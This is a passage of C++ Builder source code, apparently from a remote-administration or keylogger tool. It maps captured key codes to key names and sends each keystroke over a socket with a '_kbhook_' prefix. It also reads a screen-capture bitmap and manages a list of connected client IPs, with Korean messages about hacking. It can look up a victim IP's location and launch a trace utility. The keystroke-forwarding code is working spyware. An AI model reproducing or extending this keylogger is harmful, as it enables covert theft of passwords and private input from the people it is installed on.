        else if(VKCode==73) Key2 = Key[41];
        else if(VKCode==74) Key2 = Key[42];
        else if(VKCode==75) Key2 = Key[43];
        else if(VKCode==76) Key2 = Key[44];
        else if(VKCode==77) Key2 = Key[45];
        else if(VKCode==78) Key2 = Key[46];
        else if(VKCode==79) Key2 = Key[47];
        else if(VKCode==80) Key2 = Key[48];
        else if(VKCode==81) Key2 = Key[49];
        else if(VKCode==82) Key2 = Key[50];
        else if(VKCode==83) Key2 = Key[51];
        else if(VKCode==84) Key2 = Key[52];
        else if(VKCode==85) Key2 = Key[53];
        else if(VKCode==86) Key2 = Key[54];
        else if(VKCode==87) Key2 = Key[55];
        else if(VKCode==88) Key2 = Key[56];
        else if(VKCode==89) Key2 = Key[57];
        else if(VKCode==90) Key2 = Key[58];
        else if(VKCode==91) Key2 = Key[59];
        else if(VKCode==93) Key2 = Key[60];
        else if(VKCode==112) Key2 = Key[61];
        else if(VKCode==113) Key2 = Key[62];
        else if(VKCode==114) Key2 = Key[63];
        else if(VKCode==115) Key2 = Key[64];
        else if(VKCode==116) Key2 = Key[65];
        else if(VKCode==117) Key2 = Key[66];
        else if(VKCode==118) Key2 = Key[67];
        else if(VKCode==119) Key2 = Key[68];
        else if(VKCode==120) Key2 = Key[69];
        else if(VKCode==121) Key2 = Key[70];
        else if(VKCode==122) Key2 = Key[71];
        else if(VKCode==123) Key2 = Key[72];
        else if(VKCode==186) Key2 = Key[73];
        else if(VKCode==187) Key2 = Key[74];
        else if(VKCode==188) Key2 = Key[75];
        else if(VKCode==189) Key2 = Key[76];
        else if(VKCode==190) Key2 = Key[77];
        else if(VKCode==191) Key2 = Key[78];
        else if(VKCode==192) Key2 = Key[79];
        else if(VKCode==220) Key2 = Key[80];
        else Key2=IntToStr(VKCode);
    }
    else
    {
        if(VKCode==44) Key2 = Key[20];
        else if(VKCode==16) Key2 = Key[81];
    }
    if(Key2!="") FSS1->Socket->Connections[0]->SendText("_kbhook_"+Key2);
    Key2="";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::cap()
{
    upfs2=new TFileStream("C:\\picture.bmp", fmOpenRead|fmShareCompat);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
    if(Form2->RadioGroup1->ItemIndex == 4)
    {
        AnsiString hook2 = "";
        for(int hook1=0; hook1<ListBox1->Items->Count; hook1++)
        {
            if(ListBox1->Items->Strings[hook1].Pos("Checked")<7)
            {
                hook2 = ListBox1->Items->Strings[hook1] + "\r\n";
                ServerSocket1->Socket->Disconnect(hook1);
                ListBox1->Items->Delete(hook1);
            }
        }
        if(hook2!="")
        {
            ShowMessage("해킹중인 아이피\r\n"+hook2);
            ShowMessage("해킹중인 아이피 차단");
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N20Click(TObject *Sender)
{
    AnsiString host1="http://www.melissadata.com/lookups/iplocation.asp?ipaddress="+ListBox1->Items->Strings[ListBox1->ItemIndex];
    host1 = host1.Delete(host1.Pos(":Checked"),8);
    ShellExecute(Handle,"open",host1.c_str(),"","",SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N21Click(TObject *Sender)
{
    ShellExecute(Handle,"open","C:\\Program Files\\NeoTracePro\\NeoTrace.exe","","",SW_SHOWNORMAL);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ServerSocket1ClientError(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    ErrorCode = 0;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FSS1ClientError(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    ErrorCode = 0;    
}
//---------------------------------------------------------------------------

